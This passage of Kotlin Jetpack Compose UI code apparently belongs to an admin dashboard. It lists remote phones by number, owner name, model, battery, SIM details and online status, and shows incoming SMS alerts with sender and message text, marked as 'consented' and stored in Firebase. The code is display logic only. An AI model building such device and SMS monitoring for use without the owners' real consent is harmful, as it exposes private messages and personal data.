                            horizontalArrangement = Arrangement.spacedBy(14.dp),
                            verticalAlignment = Alignment.Top
                        ) {
                            // Left Column: Number + Gradient Phone Screen Thumbnail
                            Column(
                                horizontalAlignment = Alignment.Start,
                                verticalArrangement = Arrangement.spacedBy(8.dp)
                            ) {
                                Text(
                                    text = "${index + 1}",
                                    fontSize = 16.sp,
                                    fontWeight = FontWeight.Medium,
                                    color = Color(0xFF0F172A),
                                    modifier = Modifier.padding(start = 4.dp)
                                )
                                GradientPhoneThumbnail(
                                    modifier = Modifier
                                        .width(66.dp)
                                        .height(106.dp)
                                )
                            }

                            // Right Column: Device Fields & Action Icons
                            Column(
                                modifier = Modifier.weight(1f),
                                verticalArrangement = Arrangement.spacedBy(4.dp)
                            ) {
                                Text(
                                    text = "Phone: ${item.mobileNumber}",
                                    fontSize = 15.sp,
                                    fontWeight = FontWeight.Bold,
                                    color = Color(0xFF0F172A),
                                    maxLines = 1,
                                    overflow = TextOverflow.Ellipsis
                                )
                                Text(
                                    text = "Name: ${item.userName}",
                                    fontSize = 15.sp,
                                    fontWeight = FontWeight.Bold,
                                    color = Color(0xFF0F172A),
                                    maxLines = 1,
                                    overflow = TextOverflow.Ellipsis
                                )
                                Text(
                                    text = "Model: ${item.deviceModel}",
                                    fontSize = 15.sp,
                                    fontWeight = FontWeight.Bold,
                                    color = Color(0xFF0F172A),
                                    maxLines = 1,
                                    overflow = TextOverflow.Ellipsis
                                )
                                Text(
                                    text = "Battery: ${item.batteryPercentage}",
                                    fontSize = 15.sp,
                                    fontWeight = FontWeight.Bold,
                                    color = Color(0xFF0F172A)
                                )
                                Text(
                                    text = "SIM 1: ${item.sim1Details}",
                                    fontSize = 12.sp,
                                    fontWeight = FontWeight.SemiBold,
                                    color = Color(0xFF334155),
                                    maxLines = 1,
                                    overflow = TextOverflow.Ellipsis
                                )
                                Text(
                                    text = "Date: $displayDate",
                                    fontSize = 12.sp,
                                    color = Color(0xFF64748B),
                                    maxLines = 1,
                                    overflow = TextOverflow.Ellipsis
                                )

                                Row(
                                    modifier = Modifier
                                        .fillMaxWidth()
                                        .padding(top = 4.dp),
                                    horizontalArrangement = Arrangement.SpaceBetween,
                                    verticalAlignment = Alignment.CenterVertically
                                ) {
                                    Text(
                                        text = if (item.isOnline) "Status: Online" else "Status: Offline",
                                        fontSize = 14.sp,
                                        fontWeight = FontWeight.Bold,
                                        color = if (item.isOnline) GreenOnline else OrangeOffline
                                    )

                                    Row(
                                        verticalAlignment = Alignment.CenterVertically,
                                        horizontalArrangement = Arrangement.spacedBy(12.dp)
                                    ) {
                                        Icon(
                                            imageVector = if (isStarred) Icons.Filled.Star else Icons.Outlined.StarOutline,
                                            contentDescription = "Star",
                                            tint = if (isStarred) StarGold else Color(0xFF0F172A),
                                            modifier = Modifier
                                                .size(24.dp)
                                                .clickable { toggleStar(item.mobileNumber) }
                                        )
                                        Icon(
                                            imageVector = Icons.Filled.Info,
                                            contentDescription = "Info",
                                            tint = Color(0xFF0F172A),
                                            modifier = Modifier
                                                .size(24.dp)
                                                .clickable { infoUser = item }
                                        )
                                        Icon(
                                            imageVector = Icons.Filled.Delete,
                                            contentDescription = "Delete",
                                            tint = Color(0xFF0F172A),
                                            modifier = Modifier
                                                .size(24.dp)
                                                .clickable { deleteTarget = item }
                                        )
                                    }
                                }
                            }
                        }
                    }
                }

                // Bottom Consented SMS Alerts Section
                item {
                    Row(
                        modifier = Modifier
                            .fillMaxWidth()
                            .padding(top = 8.dp, bottom = 2.dp),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Text(
                            text = "SMS Alerts (${smsAlerts.size})",
                            fontSize = 16.sp,
                            fontWeight = FontWeight.Bold,
                            color = Color(0xFF0F172A)
                        )
                        val newCount = smsAlerts.count { it.status == "New" }
                        if (newCount > 0) {
                            Text(
                                text = "$newCount New",
                                fontSize = 12.sp,
                                fontWeight = FontWeight.Bold,
                                color = GreenOnline
                            )
                        }
                    }
                }

                if (smsAlerts.isEmpty()) {
                    item {
                        Box(
                            modifier = Modifier
                                .fillMaxWidth()
                                .border(1.dp, CardBorder, RoundedCornerShape(12.dp))
                                .padding(18.dp),
                            contentAlignment = Alignment.Center
                        ) {
                            Text(
                                text = "No consented SMS arrival alerts recorded yet.",
                                fontSize = 13.sp,
                                color = Color(0xFF64748B)
                            )
                        }
                    }
                } else {
                    itemsIndexed(smsAlerts, key = { _, alert -> "${alert.mobileNumber}_${alert.id}" }) { idx, alert ->
                        val matchedName = users.firstOrNull { it.mobileNumber == alert.mobileNumber }?.userName
                        Column(
                            modifier = Modifier
                                .fillMaxWidth()
                                .background(Color.White, RoundedCornerShape(12.dp))
                                .border(1.dp, CardBorder, RoundedCornerShape(12.dp))
                                .padding(12.dp),
                            verticalArrangement = Arrangement.spacedBy(4.dp)
                        ) {
                            Row(
                                modifier = Modifier.fillMaxWidth(),
                                horizontalArrangement = Arrangement.SpaceBetween,
                                verticalAlignment = Alignment.CenterVertically
                            ) {
                                Text(
                                    text = "${idx + 1}. Phone: ${alert.mobileNumber}${matchedName?.let { " ($it)" } ?: ""}",
                                    fontSize = 14.sp,
                                    fontWeight = FontWeight.Bold,
                                    color = Color(0xFF0F172A),
                                    modifier = Modifier.weight(1f),
                                    maxLines = 1,
                                    overflow = TextOverflow.Ellipsis
                                )
                                Text(
                                    text = "Status: ${alert.status}",
                                    fontSize = 12.sp,
                                    fontWeight = FontWeight.Bold,
                                    color = if (alert.status == "New") GreenOnline else Color(0xFF64748B)
                                )
                            }
                            Text(
                                text = "Alert: ${alert.alertMessage}",
                                fontSize = 13.sp,
                                fontWeight = FontWeight.SemiBold,
                                color = Color(0xFF0F172A)
                            )
                            Text(
                                text = "Sender: ${alert.senderNumber}",
                                fontSize = 12.sp,
                                color = Color(0xFF334155)
                            )
                            Row(
                                modifier = Modifier.fillMaxWidth(),
                                horizontalArrangement = Arrangement.SpaceBetween,
                                verticalAlignment = Alignment.CenterVertically
                            ) {
                                Text(
                                    text = "Date: ${alert.receivedAtFormatted}",
                                    fontSize = 12.sp,
                                    color = Color(0xFF64748B)
                                )
                                if (alert.status == "New") {
                                    TextButton(
                                        contentPadding = PaddingValues(horizontal = 8.dp, vertical = 2.dp),
                                        onClick = {
                                            database.getReference("sms_alerts/${alert.mobileNumber}/${alert.id}/status")
                                                .setValue("Seen")
                                        }
                                    ) {
                                        Text(
                                            text = "Mark Seen",
                                            fontSize = 12.sp,
                                            fontWeight = FontWeight.Bold,
                                            color = GreenOnline
                                        )
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
